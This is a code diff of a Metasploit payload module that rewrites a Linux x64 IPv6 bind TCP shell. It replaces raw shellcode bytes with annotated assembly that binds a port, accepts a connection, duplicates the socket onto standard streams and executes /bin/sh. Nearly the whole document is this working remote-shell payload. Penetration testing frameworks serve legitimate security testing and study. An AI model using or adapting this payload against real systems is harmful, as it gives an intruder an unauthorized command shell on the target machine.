@@ -9,7 +9,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 115
+  CachedSize = 94
 
   include Msf::Payload::Single
   include Msf::Payload::Linux
@@ -25,90 +25,113 @@ module MetasploitModule
       'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
-          'Offsets' =>
-            {
-              'LPORT'    => [ 21, 'n' ],
-            },
-          'Payload' =>
-            # <_start>:
-            "\x6a\x29"                	    +   #   push   0x29
-            "\x58"                   	    +   #   pop    rax
-            "\x6a\x0a"                	    +   #   push   0xa
-            "\x5f"                   	    +   #   pop    rdi
-            "\x6a\x01"                	    +   #   push   0x1
-            "\x5e"                   	    +   #   pop    rsi
-            "\x31\xd2"                	    +   #   xor    edx,edx
-            "\x0f\x05"                	    +   #   syscall
-            "\x89\xc7"               	    +   #   mov    edi,eax
-
-            # <populate_sockaddr_in6>:
-            "\x52"                   	    +   #   push   rdx
-            "\x52"                   	    +   #   push   rdx
-            "\x52"                   	    +   #   push   rdx
-            "\x52"                   	    +   #   push   rdx
-            "\x66\x68\x11\x5c"         	    +   #   pushw  0x5c11
-            "\x66\x6a\x0a"             	    +   #   pushw  0xa
-            "\x54"                   	    +   #   push   rsp
-            "\x5e"                   	    +   #   pop    rsi
-
-            # <bind_call>:
-            "\x6a\x31"                	    +   #   push   0x31
-            "\x58"                  	    +   #   pop    rax
-            "\x6a\x1c"                	    +   #   push   0x1c
-            "\x5a"                  	    +   #   pop    rdx
-            "\x0f\x05"                	    +   #   syscall
-
-            # <listen_call>:
-            "\x6a\x32"                	    +   #   push   0x32
-            "\x58"                   	    +   #   pop    rax
-            "\x6a\x01"                	    +   #   push   0x1
-            "\x5e"                   	    +   #   pop    rsi
-            "\x0f\x05"                	    +   #   syscall
-
-            # <accept_call>:
-            "\x6a\x2b"                	    +   #   push   0x2b
-            "\x58"                   	    +   #   pop    rax
-            "\x99"                   	    +   #   cdq
-            "\x52"                   	    +   #   push   rdx
-            "\x52"                   	    +   #   push   rdx
-            "\x48\x89\xe6"             	    +   #   mov    rsi,rsp
-            "\x6a\x1c"                	    +   #   push   0x1c
-            "\x48\x8d\x14\x24"         	    +   #   lea    rdx,[rsp]
-            "\x0f\x05"                	    +   #   syscall
-            "\x49\x89\xc7"             	    +   #   mov    r15,rax
-
-            # <dup2_calls>:
-            "\x6a\x03"                	    +   #   push   0x3
-            "\x59"                   	    +   #   pop    rcx
-            "\x6a\x02"                	    +   #   push   0x2
-            "\x5b"                   	    +   #   pop    rbx
-
-            # <dup2_loop>:
-            "\x6a\x21"                	    +   #   push   0x21
-            "\x58"                  	    +   #   pop    rax
-            "\x4c\x89\xff"             	    +   #   mov    rdi,r15
-            "\x89\xde"                	    +   #   mov    esi,ebx
-            "\x51"                  	    +   #   push   rcx
-            "\x0f\x05"                	    +   #   syscall
-            "\x59"                  	    +   #   pop    rcx
-            "\x48\xff\xcb"             	    +   #   dec    rbx
-            "\xe2\xef"                	    +   #   loop   401046 <dup2_loop>
-
-            # <exec_call>:
-            "\x31\xd2"                	    +   #   xor    edx,edx
-            "\x52"                   	    +   #   push   rdx
-            "\x48\xbb\x2f\x62\x69\x6e\x2f"  +   #   movabs rbx,0x68732f2f6e69622f
-            "\x2f\x73\x68"                  +   #
-            "\x53"                     	    +   #   push   rbx
-            "\x48\x89\xe7"                  +   #   mov    rdi,rsp
-            "\x52"                          +   #   push   rdx
-            "\x57"                          +   #   push   rdi
-            "\x48\x89\xe6"                  +   #   mov    rsi,rsp
-            "\x48\x8d\x42\x3b"              +   #   lea    rax,[rdx+0x3b]
-            "\x0f\x05"                          #   syscall
-        }
       ))
+
+    def generate_stage
+      # tcp port conversion; shamelessly stolen from linux/x86/shell_reverse_tcp_ipv6.rb
+      port_order = ([1,0]) # byte ordering
+      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
+      tcp_port.pop     # removes the first useless / from  the array
+      tcp_port.shift   # removes the last useless  / from  the array
+      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
+
+      payload = <<-EOS
+          socket_call:
+            ; int socket(int domain, int type, int protocol)
+            push   0x29
+            pop    rax                          ; socket syscall
+            push   0xa
+            pop    rdi                          ; AF_INET6
+            push   0x1
+            pop    rsi                          ; SOCK_STREAM
+            xor    edx,edx                      ; auto-select protocol
+            syscall
+
+            push rax
+            pop rdi                             ; store socket fd
+
+        populate_sockaddr_in6:
+            ; struct sockaddr_in6 {
+            ;     sa_family_t     sin6_family;   /* AF_INET6 */
+            ;     in_port_t       sin6_port;     /* port number */
+            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */
+            ;     struct in6_addr sin6_addr;     /* IPv6 address */
+            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
+            ; };
+
+            ; struct in6_addr {
+            ;     unsigned char   s6_addr[16];   /* IPv6 address */
+            ; };
+            cdq                                 ; zero-out rdx via sign-extension
+            push   rdx
+            push   rdx
+            push   rdx                          ; 24 bytes of sockaddr_in6, all 0x0
+            push.i16  0x#{tcp_port}             ; sin6_port
+            push.i16  0xa                       ; sin6_family
+            push   rsp
+            pop    rsi                          ; store pointer to struct
+
+        bind_call:
+            ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+            ; rdi -> fd already stored in rdi
+            ; rsi -> pointer to sockaddr_in6 struct already in rsi
+            push   0x31
+            pop    rax                          ; bind syscall
+            push   0x1c
+            pop    rdx                          ; length of sockaddr_in6 (28)
+            syscall
+
+        listen_call:
+            ; int listen(int sockfd, int backlog);
+            ; rdi -> fd already stored in rdi
+            push   0x32
+            pop    rax                          ; listen syscall
+            push   0x1
+            pop    rsi                          ; backlog
+            syscall
+
+        accept_call:
+            ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+            ; rdi -> fd already stored in rdi
+            push   0x2b
+            pop    rax                          ; accept syscall
+            cdq                                 ; zero-out rdx via sign-extension
+            push   rdx
+            push   rdx
+            push rsp
+            pop rsi                             ; when populated, client will be stored in rsi
+            push   0x1c
+            lea    rdx, [rsp]                   ; pointer to length of rsi (16)
+            syscall
+
+        dup2_calls:
+            ; int dup2(int oldfd, int newfd);
+            xchg    rdi, rax                    ; grab client fd
+            push   0x3
+            pop    rsi                          ; newfd 
+
+        dup2_loop:
+            ; 2 -> 1 -> 0 (3 iterations)
+            push   0x21
+            pop    rax                          ; dup2 syscall
+            dec esi
+            syscall 
+            loopnz   dup2_loop
+
+        exec_call:
+            ; int execve(const char *filename, char *const argv[], char *const envp[]);
+            push 0x3b
+            pop rax                             ; execve call
+            cdq                                 ; zero-out rdx via sign-extension
+            mov rbx, '/bin/sh'
+            push rbx
+            push rsp
+            pop rdi                             ; address of /bin/sh
+            syscall
+
+      EOS
+
+      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
+    end
   end
 end
